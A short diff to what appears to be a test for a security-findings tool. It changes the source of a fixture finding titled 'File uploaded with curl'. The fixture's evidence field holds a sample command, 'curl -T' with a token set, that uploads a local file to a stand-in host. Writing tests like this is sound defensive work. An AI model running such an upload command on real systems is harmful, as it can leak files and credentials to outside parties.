@@ -281,7 +281,7 @@ class ResolvedFindings(Box):
         self.audit()
         snap = self.snap()
         snap["findings"].append({"key": "aaaabbbbccccdddd", "rule": "ISR-H005", "title": "File uploaded with curl", "severity": "high",
-                                 "owasp": [], "where": "/nowhere/.bash_history:+1", "fix": "f", "source": "watchtower",
+                                 "owasp": [], "where": "/nowhere/.bash_history:+1", "fix": "f", "source": "isr-bot",
                                  "class": "evidence", "label": isr.CONFIRMED,
                                  "evidence": "TOKEN=FAKElegacy curl -T notes.txt https://files.example"})
         json.dump(snap, open(isr.state_path("last_findings.json"), "w"))
